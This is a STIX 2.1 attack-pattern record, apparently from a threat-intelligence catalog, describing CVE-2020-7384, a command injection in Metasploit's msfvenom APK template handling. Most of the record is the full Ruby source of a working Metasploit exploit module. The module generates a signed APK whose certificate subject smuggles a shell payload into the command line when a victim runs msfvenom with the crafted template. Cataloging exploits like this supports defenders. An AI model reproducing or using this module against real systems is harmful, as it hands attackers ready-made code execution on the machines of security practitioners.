{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--634fdef0-812d-4f44-b98e-6d079957c80c",
    "created": "2024-08-14T17:14:07.154984Z",
    "modified": "2024-08-14T17:14:07.154988Z",
    "name": "Rapid7 Metasploit Framework msfvenom APK Template Command Injection",
    "description": " This module exploits a command injection vulnerability in Metasploit Framework's msfvenom payload generator when using a crafted APK file as an Android payload template. Affects Metasploit Framework <= 6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this module is a relatively empty yet valid-enough APK file. To trigger the vulnerability the victim user should do the following:  msfvenom -p android/<...> -x <crafted_file.apk>  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection.rb",
            "external_id": "metasploit_msfvenom_apk_template_cmd_injection.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7384"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip/jar'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Rapid7 Metasploit Framework msfvenom APK Template Command Injection',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in Metasploit Framework's msfvenom\n          payload generator when using a crafted APK file as an Android payload template. Affects\n          Metasploit Framework <= 6.0.11 and Metasploit Pro <= 4.18.0. The file produced by this\n          module is a relatively empty yet valid-enough APK file. To trigger the vulnerability,\n          the victim user should do the following:\n\n          msfvenom -p android/<...> -x <crafted_file.apk>\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Justin Steven' # @justinsteven\n        ],\n        'References' => [\n          ['URL', 'https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md'],\n          ['CVE', '2020-7384'],\n        ],\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => true\n        },\n        'Arch' => ARCH_CMD,\n        'Platform' => 'unix',\n        'Payload' => {\n          'BadChars' => \"\\x22\\x2c\\x5c\\x0a\\x0d\"\n        },\n        'Targets' => [[ 'Automatic', {}]],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-10-29',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [SCREEN_EFFECTS]\n        }\n      )\n    )\n    register_options([\n      OptString.new('FILENAME', [true, 'The APK file name', 'msf.apk'])\n    ])\n  end\n\n  def build_x509_name\n    name = \"CN=';(#{payload.encoded}) >&- 2>&- & #\"\n    OpenSSL::X509::Name.parse(name)\n  end\n\n  def generate_signing_material\n    key = OpenSSL::PKey::RSA.new(2048)\n    cert = OpenSSL::X509::Certificate.new\n    cert.version = 2\n    cert.serial = 1\n    cert.subject = cert.issuer = build_x509_name\n    cert.public_key = key.public_key\n    cert.not_before = Time.now\n    # FIXME: this will break in the year 2037 on 32-bit systems\n    cert.not_after = cert.not_before + 1.year\n    # Self-sign the certificate, otherwise the victim's keytool gets unhappy\n    cert.sign(key, OpenSSL::Digest.new('SHA256'))\n\n    [cert, key]\n  end\n\n  def exploit\n    apk = Rex::Zip::Jar.new\n    apk.build_manifest\n    cert, key = generate_signing_material\n    apk.sign(key, cert)\n    data = apk.pack\n    file_create(data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-29",
    "x_mitre_platforms": [
        "unix'"
    ]
}